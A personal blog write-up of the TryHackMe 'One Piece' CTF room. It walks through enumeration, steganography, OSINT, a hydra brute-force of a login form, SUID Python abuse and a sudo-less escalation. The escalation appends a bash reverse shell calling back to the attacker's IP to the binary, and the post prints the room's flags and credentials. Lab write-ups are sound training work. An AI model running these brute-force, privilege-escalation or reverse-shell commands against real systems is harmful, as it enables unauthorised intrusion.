---
title: "One Piece"
date: 2024-01-17T22:30:00+01:00
draft: false
categories:
  - TryHackMe
---

![One Piece](/thm/One%20Piece/luffy.jpeg)

It's been a while I didn't play a CTF on TryHackMe. While searching for a fun room I found one named "One Piece".
I was like...wait, why is this not already done? Who would not want to do a CTF on One Piece? c'mon! let's set sail!

## Enumeration

```bash

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.4.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 011818f9b78ac36c7f922d939055a129 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC45MSZ6fV/xyKjd0Vlj750dJSO5TPl1lrNfd+t+qc4LIKnaMoUsyIuxlnTOSQ0yHhGCxRYaDheybyGr1JqQrFazro9bL5cr3o0LQYLgTWbTcVAgkByqDvblrqUj1c6O4R0Z3BoppqzBgXIsUJFw96HAiYzVJCh9RN2rGnAHmqy8lIS/Z56pFlmiEOc3/W1ccnA/ABAIWkX25Kpxz+QE1eMEWEswLG57qmG8nt0qkOT6hQ9sskVW/ADnUmY3rO/dsP7TXh/IvI1slb6HALUlQXXfGUp/2CwOS7SfIthom8HJ3s7STVVOiAQM6xw6USA9QFLObcUSV0qHpXzJnyQtqtl
|   256 cc0218a9b52b49e45b77f96ec2dbc90d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLQ8y5fOAYcijtTXLprC5JojtRJvMIvbUGGFTMN5eYol3XZucpVKnt/fyLV/5x1jWXsnQixuE2QMCJ6hNRGwHgw=
|   256 b85272e62ad57e563d167bbc518c7b2a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIWb4BgTYBRRA6bswNkUVwbviPydKMyyWsLyspHwzc/B
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: C31581B251EA41386CB903FC27B37692
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: New World
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

First the ftp service. We can login anonymously so let's get 'em

```bash
└─(13:06:33)──> ftp 10.10.194.115                                                                                                    ──(mar.,janv.16)─┘
Connected to 10.10.194.115.
220 (vsFTPd 3.0.3)
Name (10.10.194.115:nairolf32): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||60312|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             187 Jul 26  2020 welcome.txt
226 Directory send OK.
ftp> get welcome.txt
local: welcome.txt remote: welcome.txt
229 Entering Extended Passive Mode (|||24304|)
150 Opening BINARY mode data connection for welcome.txt (187 bytes).
100% |***********************************************************************************************************|   187      216.62 KiB/s    00:00 ETA
226 Transfer complete.
187 bytes received in 00:00 (1.08 KiB/s)
```

The welcome file is not very useful. Mostly stuff about Zou island

Silly me

```bash
ftp> ls -al
229 Entering Extended Passive Mode (|||5436|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jul 26  2020 .
drwxr-xr-x    3 0        0            4096 Jul 26  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 26  2020 .the_whale_tree
-rw-r--r--    1 0        0             187 Jul 26  2020 welcome.txt
226 Directory send OK.
```

Good old hidden files. Let's get it

```bash
ftp> cd .the_whale_tree
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||21545|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 26  2020 .
drwxr-xr-x    3 0        0            4096 Jul 26  2020 ..
-rw-r--r--    1 0        0            8652 Jul 26  2020 .road_poneglyph.jpeg
-rw-r--r--    1 0        0            1147 Jul 26  2020 .secret_room.txt
```

Anyways, we got a `road_poneglyph.jpeg` and a `secret_room.txt` from `the whale`. The first poneglyph looks like blatant steganography. jpeg = steghide (sometimes) but first I make sure it's a jpeg using `file`

```bash

└─(13:24:39 on master ✭)──> file .road_poneglyph.jpeg                                                                                ──(mar.,janv.16)─┘
.road_poneglyph.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 270x187, components 3
└─(13:25:52 on master ✭)──> steghide --extract -sf .road_poneglyph.jpeg                                                              ──(mar.,janv.16)─┘
Entrez la passphrase: 
�criture des donn�es extraites dans "road_poneglyphe1.txt".
```

Got `road_poneglyphe1.txt` But wait...there is more! Back to the kitchen with the contents we use a special sauce mixing

base32, morse, Binary, hex...then??? `3HTXi9i2T2` .... I don't know what to do with that...

Let's keep it for later. Maybe we need to assemble them (anime vibes 101)

More exploration!

On the website we get a beautiful picture of the crew with the merry go

The source code reveals this:

<!--J5VEKNCJKZEXEUSDJZEE2MC2M5KFGWJTJMYFMV2PNE2UMWLJGFBEUVKWNFGFKRJQKJLUS5SZJBBEOS2FON3U4U3TFNLVO2ZRJVJXARCUGFHEOS2YKVWUWVKON5HEOQLVKEZGI3S2GJFEOSKTPBRFAMCGKVJEIODQKJUWQ3KMIMYUCY3LNBGUWMCFO5IGYQTWKJ4VMRK2KRJEKWTMGRUVCMCKONQTGTJ5-->

We run to the kitchen (cyberchef) and we got something about nami being a silly navigator:

"Nami ensures there are precisely 3472 possible places where she could have lost it."

And gentlemen this is where we got stuck! The hint at first made no sense to me: "Only Sea, I'ts Not Terrible"...ooohhh...OSINT!

That's terrible! Who would have thought of that? We do some "searching" but damn it's so guessy...I usually like OSINT but damn...why here?

We get this [github link](https://github.com/1FreyR/LogPose/blob/master/LogPose.txt) and we get a [LogPose.txt](/thm/One%20Piece/LogPose.txt) file

We use it with gobuster to find our next destination. Don't worry I won't edit the directory name...it's on me...No one deserve this suffering

```bash
└─(14:27:51 on master ✭)──> gobuster dir -w LogPose.txt -u http://10.10.135.84 -x html,php,txt    

/dr3ssr0s4.html       (Status: 200) [Size: 3985]

```

Lol When I saw "dressrosa" I knew It would be `Donquixote Doflamingo`. There are multiple div elemeents overlaying an image named "rabbit_hole.png". I know it's tempting but when the author himself says it's a rabbit hole...it's a rabbit hole!

We got stuck again...for a while.  We ended up exploring the css of the page (who even do that???) and unlocked the gear fourth

![king kong gun](/thm/One%20Piece/king_kong_gun.jpg)

```strings
└─(14:44:36 on master ✭)──> strings king_kong_gun.jpg                                                                                ──(mar.,janv.16)─┘
JFIF
Doflamingo is /ko.jpg

```

Use `strings` again and find our next destination. it's `whole cake` if you wonder. We get input field and a button. I immediately fire burp suite and intercept the request. Funny how it's a `cookie` we have to tamper with. I had a terrible experience with those encoded texts (mostly rabbit holes...so many rabbit holes)

We get the 2nd poneglyph then focus on "random island" instead...Seems like `buggy the clown` is our friend now.

As checking the source code is very important here we check everything...The css, the javascript...Everything! We find our next destination in `brain_teaser.js`. It's `Onigashima` where we fight `Kaido of the beasts`. We have two options. A login form and an upload form. Also a hint about "bruteforce" or something (I don't like bruteforcing much)

I was stuck again but once again I got a little help about steganography on the kaido image

```bash
└─(15:16:50 on master ✭)──> stegseek -wl /usr/share/wordlists/rockyou.txt -sf kaido.jpeg                                             ──(mar.,janv.16)─┘
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "imabeast"       
[i] Original filename: "kaido_login.txt".
[i] Extracting to "kaido.jpeg.out".

```

## Exploitation

![kaido](/thm/One%20Piece/kaido.jpeg)

Cool. The username to use is known we need the password now...maybe...bruteforce?

```bash

└─(15:25:11 on master ✭)──> hydra -l K1ng_0f_th3_B3@sts -P "/usr/share/wordlists/rockyou.txt" 10.10.135.85 http-post-form "/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-16 15:26:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.135.85:80/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR
[STATUS] 32.00 tries/min, 32 tries in 00:01h, 14344374 to do in 7471:02h, 16 active
[STATUS] 32.00 tries/min, 96 tries in 00:03h, 14344336 to do in 7471:01h, 16 active

...

```

quite long...You need a lot of patience here (damn I hate bruteforce)

After getting the password we login and get the 3rd poneglyph also this...

"You succeed to run away and there is only one Road Poneglyph left to find to be able to reach Laugh Tale.
Unfortunately, the location of this last Poneglyph is unspecified."

Once again very infuriating situation...you won't believe what the author did here...

visit `/unspecified`...yeah that's right...That was the solution!!

the last poneglyph is there so I assembled all four and decoded them all with the same sauce

ssh with the credentials you just got

```bash
└─(17:27:07 on master ✭)──> ssh M0nk3y_D_7uffy@10.10.80.106                                                                    255 ↵ ──(mar.,janv.16)─┘
The authenticity of host '10.10.80.106 (10.10.80.106)' can't be established.
ECDSA key fingerprint is SHA256:zOHT7dbvRJlqSe19yomTmKvQHVgvwDLd7X8gGWScz84.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.80.106' (ECDSA) to the list of known hosts.
M0nk3y_D_7uffy@10.10.80.106's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-041500-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


18 packages can be updated.
13 updates are security updates.

Last login: Fri Aug 14 15:23:58 2020 from 192.168.1.7
M0nk3y_D_7uffy@Laugh-Tale:~$ ls
laugh_tale.txt
M0nk3y_D_7uffy@Laugh-Tale:~$ cat laugh_tale.txt
Finally, we reached Laugh Tale.
All is left to do is to find the One Piece.
Wait, there is another boat in here.
Be careful, it is the boat of Marshall D Teach, one of the 4 Emperors. He is the one that led your brother Ace to his death.
You want your revenge. Let's take him down !
```

We reached laugh tale!

## Privilege escalation

`Marshall D teach` is here too

We try the classics...`sudo -l` didnt work but the SUID binaries are interesting

```bash
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gomugomunooo_king_kobraaa
/usr/bin/chfn
/usr/bin/arping

...

M0nk3y_D_7uffy@Laugh-Tale:~$ gomugomunooo_king_kobraaa
Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 

```

Lol it's basically python! let's ask gtfobins

```bash
>>> import os; os.execl("/bin/sh", "sh", "-p")
$ whoami
7uffy_vs_T3@ch
$ id
uid=1001(M0nk3y_D_7uffy) gid=1001(luffy) euid=1000(7uffy_vs_T3@ch) groups=1001(luffy)
$ ls /home
luffy  teach
$ cd /home/teach
$ ls
luffy_vs_teach.txt
$ cat luffy_vs_teach.txt
This fight will determine who can take the One Piece and who will be the next Pirate King.
These 2 monsters have a matchless will and none of them can let the other prevail.
Each of them have the same dream, be the Pirate King.
For one it means: Take over the World.
For the other: Be the freest man in the World.
Each of their hit creates an earthquake felt on the entire island.
But in the end, Luffy thanks to his willpower won the fight.
Now, he needs to find the One Piece.
$ ls -al
total 56
drwxr-xr-x  7 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .
drwxr-xr-x  4 root           root  4096 Jul 26  2020 ..
-rw-------  1 7uffy_vs_T3@ch teach  334 Jul 26  2020 .ICEauthority
-rw-------  1 7uffy_vs_T3@ch teach    1 Aug 14  2020 .bash_history
-rw-r--r--  1 7uffy_vs_T3@ch teach  220 Jul 26  2020 .bash_logout
-rw-r--r--  1 7uffy_vs_T3@ch teach 3771 Jul 26  2020 .bashrc
drwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .cache
drwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .config
drwx------  3 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .gnupg
drwx------  3 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .local
-r--------  1 7uffy_vs_T3@ch teach   37 Jul 26  2020 .password.txt
-rw-r--r--  1 7uffy_vs_T3@ch teach  807 Jul 26  2020 .profile
drwx------  2 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .ssh
-rw-r--r--  1 7uffy_vs_T3@ch teach    0 Jul 26  2020 .sudo_as_admin_successful
-r--------  1 7uffy_vs_T3@ch teach  479 Jul 26  2020 luffy_vs_teach.txt
$ cat .password.txt
7uffy_vs_T3@ch:Wh0_w1ll_b3_th3_k1ng?

```

Ah yes `willpower`...that's useful indeed

Now we can try privesc basics again...I highly suspect sudo to work this time

```bash
$ su 7uffy_vs_T3@ch
Password: 
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo -l
[sudo] password for 7uffy_vs_T3@ch: 
Matching Defaults entries for 7uffy_vs_T3@ch on Laugh-Tale:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User 7uffy_vs_T3@ch may run the following commands on Laugh-Tale:
    (ALL) /usr/local/bin/less
7uffy_vs_T3@ch@Laugh-Tale:~$ 
```

less? really? now we can read stuff?

```bash
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo less /root/flag.txt
Sorry, I can't tell you where is the One Piece
```

sike...they got me! After "looking it up" we learn that less can be used to execute commands

funny how...

```bash
7uffy_vs_T3@ch@Laugh-Tale:~$  echo 'bash -i >& /dev/tcp/10.8.4.19/4444 0>&1' >> /usr/local/bin/less
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo less
Sorry, I can't tell you where is the One Piece

```

and on the listenner we have this...

```bash
└─(15:43:40)──> nc -lnvp 4444                                                                                                        ──(mar.,janv.16)─┘
listening on [any] 4444 ...
connect to [10.8.4.19] from (UNKNOWN) [10.10.80.106] 53462
root@Laugh-Tale:~# id
id
uid=0(root) gid=0(root) groups=0(root)

```

We did it boys! We can grab the one piece now

```bash

root@Laugh-Tale:/root# ls -al
ls -al
total 36
drwx------  5 root root 4096 Jul 29  2020 .
drwxr-xr-x 24 root root 4096 Jul 29  2020 ..
-rw-------  1 root root  217 Aug 14  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Feb  3  2020 .cache
drwx------  3 root root 4096 Jul 26  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jul 26  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root    0 Jul 26  2020 .python_history
-rw-r--r--  1 root root  172 Jul 29  2020 .wget-hst
```

Actually...no! I hate this room...I hate it so much

```bash
root@Laugh-Tale:~# find / -name "*.txt" -user root
find / -name "*.txt" -user root
/snap/gnome-3-34-1804/36/etc/X11/rgb.txt
/snap/gnome-3-34-1804/36/usr/lib/python2.7/LICENSE.txt

...

/usr/share/gnupg/help.ru.txt
/usr/share/cups/doc-root/robots.txt
/usr/share/mysterious/on3_p1ec3.txt
/usr/share/ibus-table/tables/template.txt

root@Laugh-Tale:~# cat /usr/share/mysterious/on3_p1ec3.txt
cat /usr/share/mysterious/on3_p1ec3.txt
One Piece: Od@_wOnt_l3t_yOu_kn0w

```

![boat](/thm/One%20Piece/boat.png)

finally we found it, the **One Piece**!!
